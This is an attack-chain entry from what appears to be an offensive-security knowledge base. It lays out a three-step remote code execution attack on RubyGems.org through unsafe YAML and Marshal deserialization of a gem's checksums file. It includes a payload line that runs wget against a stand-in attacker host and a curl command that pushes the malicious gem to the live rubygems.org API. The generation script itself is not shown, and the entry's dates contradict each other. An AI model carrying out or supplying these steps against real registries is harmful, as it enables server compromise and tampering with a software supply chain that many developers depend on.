---
tags:
  - rce
  - deserialization
  - yaml
  - marshal
  - rubygems
  - ruby
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/ruby]]'
  - '[[tools/generate.rb-script]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/ruby-generate-payload]]'
  - '[[commands/curl-upload-malicious-gem]]'
platforms:
  - Web
  - Linux
complexity: medium
procedures:
  - '[[procedures/Analyze-RubyGems-Code-for-Deserialization-Vulnerability]]'
  - '[[procedures/Craft-Malicious-Gem-with-Deserialization-Payload]]'
  - '[[procedures/Upload-Malicious-Gem-to-Trigger-RCE]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
description: >-
  Multi-stage attack exploiting unsafe YAML deserialization in RubyGems.org's
  gem upload endpoint to achieve remote code execution on the server.
skill_level: intermediate
impact_level: high
id: 694678b7-3b00-4687-8e86-7c7695081434
created_at: '2025-12-14T17:23:53.969Z'
updated_at: '2025-12-14T17:23:53.969Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
---
# Remote Code Execution via Unsafe Deserialization in RubyGems Gem Upload

An attacker exploits an unsafe object deserialization vulnerability in RubyGems.org by uploading a malicious gem to the /api/v1/gems endpoint. The vulnerability arises from using YAML.load on the checksums.yaml.gz file within the gem, which allows attacker-controlled data to invoke Marshal.load and execute arbitrary Ruby code. This leads to remote code execution on the server, such as downloading files from an attacker-controlled server via wget.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Code Analysis] --> B[Payload Crafting]
    B --> C[Gem Upload and RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/ruby]]
- [[tools/generate.rb-script]]

### Target Environment

- RubyGems.org or similar Ruby-based gem hosting platform
- Access to /api/v1/gems endpoint (requires API authentication token)
- Network access to upload gems and host a payload server

### Initial Access Requirements

- Valid API token for gem pushes (e.g., obtained via RubyGems account)
- Attacker-controlled server to receive exfiltration (e.g., for wget callback)
- No prior server access needed; exploits public-facing upload

## Detailed Attack Procedures

### Step 1: Analyze RubyGems Code for Deserialization Vulnerability
procedure: [[procedures/Analyze-RubyGems-Code-for-Deserialization-Vulnerability]]

**Objective**: Identify the unsafe deserialization entry point in the RubyGems application code to plan the exploit.

**Instructions**: Review the source code of RubyGems, focusing on app/models/pusher.rb and gem package handling. Note the use of Gem::Package.new(body).spec and check for YAML parsing in Gem::Package#read_checksums on checksums.yaml.gz. Observe that a safe YAML monkey-patch exists in config/initializers/forbidden_yaml.rb but does not cover this method, allowing YAML.load to escalate to Marshal.load via accessible classes.

**Expected Output**: Identification of the vulnerable code path in read_checksums method.

**Success Indicators**:
- Vulnerable YAML.load call confirmed
- Bypass of safe_load patch verified

### Step 2: Craft Malicious Gem with Deserialization Payload
procedure: [[procedures/Craft-Malicious-Gem-with-Deserialization-Payload]]

**Objective**: Generate a proof-of-concept gem containing a malicious payload in the checksums.yaml.gz file to trigger deserialization and code execution.

**Instructions**: Use a Ruby script to create the payload. First, prepare payload.rb with the desired Ruby code (e.g., `system('wget http://attacker.com/shell')`). Then execute [[commands/ruby-generate-payload]] to generate the base64-encoded Marshal payload:

```bash
ruby generate.rb payload.rb
```

Insert the output into checksums.yaml.gz within the gem structure to create poc.gem.

**Expected Output**: poc.gem file with embedded malicious checksums.yaml.gz.

**Success Indicators**:
- Payload script generates valid base64 string
- Gem file assembles without errors

### Step 3: Upload Malicious Gem to Trigger RCE
procedure: [[procedures/Upload-Malicious-Gem-to-Trigger-RCE]]

**Objective**: Upload the malicious gem to the endpoint, causing the server to parse the checksums and execute the payload for RCE.

**Instructions**: Use curl to POST the gem to the API endpoint with proper headers. Pipe the poc.gem file and include authorization:

```bash
cat poc.gem | curl -H 'Content-Type: application/gzip' --data-binary @- -H 'Authorization: █████' https://rubygems.org/api/v1/gems
```

Monitor the attacker's server for the wget callback confirming execution.

**Expected Output**: Server response may show processing errors (e.g., UTF-8 issues), but payload executes (e.g., incoming wget request).

**Success Indicators**:
- Gem upload accepted
- Attacker server receives connection from target

## Attack Chain Summary

### Key Achievements

1. Discovered unsafe YAML deserialization in gem parsing
2. Crafted and uploaded a malicious gem triggering Marshal.load
3. Achieved RCE with arbitrary command execution on RubyGems server

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Exploitation for Client Execution]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---
*Last updated: 2023-10-01*
